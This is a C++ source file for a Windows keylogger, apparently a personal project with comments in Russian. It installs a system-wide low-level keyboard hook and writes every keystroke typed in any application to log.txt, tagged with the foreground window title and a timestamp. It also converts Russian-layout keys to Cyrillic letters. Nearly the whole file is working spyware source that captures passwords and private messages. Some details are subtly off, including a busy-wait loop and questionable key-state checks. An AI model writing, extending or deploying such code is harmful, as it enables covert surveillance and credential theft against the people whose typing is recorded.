// keylogger2.cpp : Определяет точку входа для приложения.
//

#include "framework.h"
#include "keylogger2.h"

using namespace std;

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	SetConsoleTitle(L"Console Window - Окно консоли");
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	//char* a = setlocale(LC_ALL, "Russian");
	SetConsoleCP(CP_UTF8);
	SetConsoleOutputCP(CP_UTF8);

	CONSOLE_FONT_INFOEX fontInfo;
	GetCurrentConsoleFontEx(hConsole, TRUE, &fontInfo);
	wchar_t* fontName = const_cast<wchar_t*>(L"Arial Cyr");
	wcsncpy_s(fontInfo.FaceName, LF_FACESIZE, fontName, sizeof(fontName));
	fontInfo.dwFontSize.X = 12;
	SetCurrentConsoleFontEx(hConsole, TRUE, &fontInfo);

	file.open("log.txt", ios_base::app);
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
	hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
	if (!hook) {
		//MessageBox(NULL, L"Error", L"Error", MB_ICONERROR);
	}
	MSG message;
	while (true) {
		PeekMessage(&message, NULL, 0, 0, 0);
	}
	file.close();

	return 0;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT kbStruct;
	if (nCode >= 0) {
		if (wParam == WM_KEYDOWN) {
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbStruct.vkCode);
		}
	}

	return CallNextHookEx(hook, nCode, wParam, lParam);
}

int Save(int key)
{
	if (key == 1 || key == 2) {
		return 0;
	}

	HWND foreground = GetForegroundWindow();
	DWORD threadId;
	HKL keyboardLayout = NULL;
	unsigned int lang;

	if (foreground) {
		threadId = GetWindowThreadProcessId(foreground, NULL);
		keyboardLayout = GetKeyboardLayout(threadId);
		lang = (unsigned int)keyboardLayout & 0x0000FFFF; // 1033 - английский 
														  // 1049 - русский
		//cout << lang << endl;
		char curProg[MaxSize];
		GetWindowTextA(foreground, curProg, MaxSize);

		if (strcmp(prevProg, curProg) != 0) {
			strcpy_s(prevProg, curProg);
			time_t rawtime;
			time(&rawtime);
			struct tm timeinfo;
			localtime_s(&timeinfo, &rawtime);
			char c[256];
			strftime(c, sizeof(c), "%c", &timeinfo);
			cout << "\n[Program: " << curProg << " DateTime: " << c << "]" << endl;
			file << "\n[Program: " << curProg << " DateTime: " << c << "]" << endl;
		}
	}

	bool upper = ((GetKeyState(VK_CAPITAL) & 0x1000) != 0);
	if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
		(GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
		(GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		upper = !upper;

	switch (key) {
	case VK_RETURN:
		file << "\n";
		cout << "\n";
		break;
	case VK_SPACE:
		file << " ";
		cout << " ";
		break;
		//дописать про верхнюю клавиатуру, а так же про <>
	default:
		if (keyboardLayout) {
			char curKey;
			wchar_t wideKey;
			std::locale loc(std::locale::classic(), new std::codecvt_utf8<wchar_t>);
			curKey = MapVirtualKeyExW(key, MAPVK_VK_TO_CHAR, keyboardLayout);
			if (curKey != '\0') {
				if (lang == RUS) {
					curKey = tolower(curKey);
					wideKey = GetRusLetter(curKey);
					if (key == 188) wideKey = L'б';//русская "Б" почему-то выдает "1"
					if (wideKey == '0')
						DataOut(curKey, upper);
					else {
						if (upper)
							wideKey = toupper(wideKey, loc);
						file.imbue(loc);
						file << wideKey;
						wcout << wideKey;
					}
				}
				else {
					DataOut(curKey, upper);
				}
			}
		}
	}

	file.flush();

	return 0;
}

void DataOut(char curKey, bool upper)
{
	if (!upper)
		curKey = tolower(curKey);

	file << curKey;
	cout << curKey;
}

wchar_t GetRusLetter(char EngLetter)
{
	string alphabE = "qwertyuiop[]asdfghjkl;'\\zxcvbnm,./";
	wstring alphabR = L"йцукенгшщзхъфывапролджэ\\ячсмитьбю.";

	map<char, wchar_t> alphabet;

	const int MaxLetters = 34;
	for (int i = 0; i < MaxLetters; i++) {
		char buff = alphabE[i];
		alphabet[buff] = alphabR[i];
	}

	wchar_t RusLetter = '0';//= alphabet.at(EngLetter);

	for (auto a : alphabet)
		if (a.first == EngLetter) {
			RusLetter = a.second;
			break;
		}

	return RusLetter;
}